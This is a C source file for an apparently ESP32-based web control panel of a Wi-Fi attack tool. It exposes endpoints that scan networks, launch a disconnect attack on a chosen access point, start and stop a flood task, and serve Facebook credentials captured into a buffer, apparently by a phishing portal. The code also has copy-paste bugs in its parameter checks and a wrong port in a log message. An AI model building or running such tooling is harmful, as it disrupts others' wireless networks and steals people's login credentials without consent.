#include "webserver.h"

void handle_scan(allocator_t* allocator, int client_sock) {
    AP_records_t* records = scan_networks(allocator, 10);
    if (records == 0) {
        ESP_LOGE("WebServer", "Failed to scan networks");
        http_send_error_response(client_sock);
        return;
    }
    char* json = records_to_json(allocator, records);
    if(json == NULL) {
        ESP_LOGE("WebServer", "Failed to convert records to JSON");
        http_send_error_response(client_sock);
        return;
    }
    printf("JSON to send: %s \n", json);
    http_send_json_response(client_sock, json);
    allocator_free(allocator, records);
}

void handle_attack(allocator_t* allocator, http_request_t* req, int client_sock) {
    char* bssid = http_request_get_url_param(allocator, req->url, "bssid");
    if (bssid == NULL) {
        ESP_LOGE("WebServer", "Failed to get BSSID from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    char* timeout_str = http_request_get_url_param(allocator, req->url, "timeout");
    if (timeout_str == NULL) {
        ESP_LOGE("WebServer", "Failed to get timeout from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    char* channel_str = http_request_get_url_param(allocator, req->url, "channel");
    if (timeout_str == NULL) {
        ESP_LOGE("WebServer", "Failed to get channel from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    char* authmode_str = http_request_get_url_param(allocator, req->url, "authmode");
    if (timeout_str == NULL) {
        ESP_LOGE("WebServer", "Failed to get authmode from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    char* ssid = http_request_get_url_param(allocator, req->url, "ssid");
    if (timeout_str == NULL) {
        ESP_LOGE("WebServer", "Failed to get ssid from URL");
        http_send_bad_request_response(client_sock);
        return;
    }
    uint8_t* bytes_bssid = bssid_string_to_bytes(allocator, bssid);
    if(bytes_bssid == NULL) {
        ESP_LOGE("WebServer", "Failed to convert BSSID string to bytes");
        http_send_error_response(client_sock);
        return;
    }
    http_send_ok_response(client_sock);
    
    int seconds;
    if(parse_int(timeout_str, &seconds) == 0){
        ESP_LOGE("WebServer", "Failed to parse timeout");
        http_send_bad_request_response(client_sock);
        return;
    }
    int channel;
    if(parse_int(channel_str, &channel) == 0){
        ESP_LOGE("WebServer", "Failed to parse channel");
        http_send_bad_request_response(client_sock);
        return;
    }
    int authmode;
    if(parse_int(authmode_str, &authmode) == 0){
        ESP_LOGE("WebServer", "Failed to parse authmode");
        http_send_bad_request_response(client_sock);
        return;
    }
    wifi_disconnect(bytes_bssid, ssid, (uint8_t)channel, (uint8_t)authmode, seconds);
}

void handle_flood(http_request_t* req, int client_sock) {
    if (flood_running || flood_task_handle != NULL) {
        http_send_error_response(client_sock); // Flood already running
        return;
    }

    if (xTaskCreate(flood_task, "FloodTask", 4096, NULL, 5, &flood_task_handle) != pdPASS) {
        http_send_error_response(client_sock); // Could not create task
        return;
    }

    http_send_ok_response(client_sock); // 200 OK
}

void handle_flood_stop(http_request_t* req, int client_sock) {
    printf("flood status: %d\n", flood_running);
    if (!flood_running || flood_task_handle == NULL) {
        printf("Flood not running sending 409\n");
        http_send_conflict_response(client_sock);
        return;
    }
    printf("Flood running 200\n");
    flood_running = false;
    http_send_ok_response(client_sock); // 200
}


void handle_facebook_data(http_request_t* req, int client_sock) {
    int res = cred_buffer_to_json(&cred_buffer, json, sizeof(json));
    if (res == -1) {
        ESP_LOGE("WebServer", "Failed to convert credentials to JSON");
        http_send_error_response(client_sock);
        return;
    }
    printf("facebook json %s\n", json);
    http_send_json_response(client_sock, json);
}

void handle_connection(allocator_t* allocator, http_request_t* req, int client_sock) {
    if(strcmp(req->method, "POST") == 0) {
        ESP_LOGI("WebServer", "Handling POST request");
        http_send_not_found_response(client_sock);
        return;
    }

    int64_t start_time = esp_timer_get_time();
    if (strcmp(req->url, "/") == 0) {
        ESP_LOGI("WebServer", "Handling root request");
        http_send_html_response(client_sock, root_page_html);
    } else if (strcmp(req->url, "/scan") == 0) {
        ESP_LOGI("WebServer", "Handling scan request");
        handle_scan(allocator, client_sock);
    } else if(strncmp(req->url, "/attack", 7) == 0) {
        ESP_LOGI("WebServer", "Handling attack request");
        handle_attack(allocator, req, client_sock);
    } else if (strcmp(req->url, "/flood") == 0) {
        ESP_LOGI("WebServer", "Handling flood request");
        handle_flood(req, client_sock);
    } else if (strcmp(req->url, "/flood/stop") == 0) {
        ESP_LOGI("WebServer", "Handling flood stop request");
        handle_flood_stop(req, client_sock);
    } else if (strcmp(req->url, "/facebook") == 0) {
        ESP_LOGI("WebServer", "Handling facebook data request");
        handle_facebook_data(req, client_sock);
    } else {
        ESP_LOGI("WebServer", "Handling not found request");
        http_send_not_found_response(client_sock);
    }
    int64_t end_time = esp_timer_get_time();
    int64_t durata = end_time - start_time;
    printf("Ruta %s a durat %lld microsecunde\n", req->url, durata);
}

void start_webserver(){
    allocator_t allocator;
    allocator_init(&allocator, main_webserver_buffer, MAIN_WEBSERVER_BUFFER_SIZE);

    ESP_LOGI("WebServer", "Creating socket...");
    int sock = socket_create(IPv4, Stream);
    if (sock < 0) {
        ESP_LOGE("WebServer", "Failed to create socket");
        return;
    }

    socket_set_reuse_addr_option(sock);

    ESP_LOGI("WebServer", "Binding socket...");
    if (socket_bind(sock, IPv4, 8000, INADDR_ANY) < 0) {
        ESP_LOGE("WebServer", "Failed to bind socket");
        close(sock);
        return;
    }

    if (socket_listen(sock, 5) < 0) {
        ESP_LOGE("WebServer", "Failed to listen on socket");
        close(sock);
        return;
    }
    ESP_LOGI("WebServer", "Web server started on port 80");

    while (1) {
        allocator_reset(&allocator);

        int client_sock = socket_accept(sock);
        if (client_sock < 0) {
            ESP_LOGE("WebServer", "Failed to accept connection");
            continue;
        }
        ESP_LOGI("WebServer", "Connection accepted...");

        char* buffer = allocator_alloc_type(&allocator, char, 1024);
        if (buffer == NULL) {
            ESP_LOGE("WebServer", "Failed to allocate memory for request");
            close(client_sock);
            continue;
        }

        ESP_LOGI("WebServer", "Reading request...");
        int len = socket_receive(client_sock, buffer, 1023);
        if (len < 0) {
            ESP_LOGE("WebServer", "Failed to receive data");
            close(client_sock);
            continue;
        }
        buffer[len] = 0;
        allocator_realloc_type(&allocator, buffer, char, len+1);

        ESP_LOGI("WebServer", "Parsing request...");
        http_request_t* req = http_request_parse(&allocator, buffer);
        if(req == NULL){
            ESP_LOGE("WebServer", "Failed to parse data");
            close(client_sock);
            continue;
        }
        printf("Request Method: %s\n", req->method);
        printf("Request URL: %s\n", req->url);

        handle_connection(&allocator, req, client_sock);
        close(client_sock);
    }
}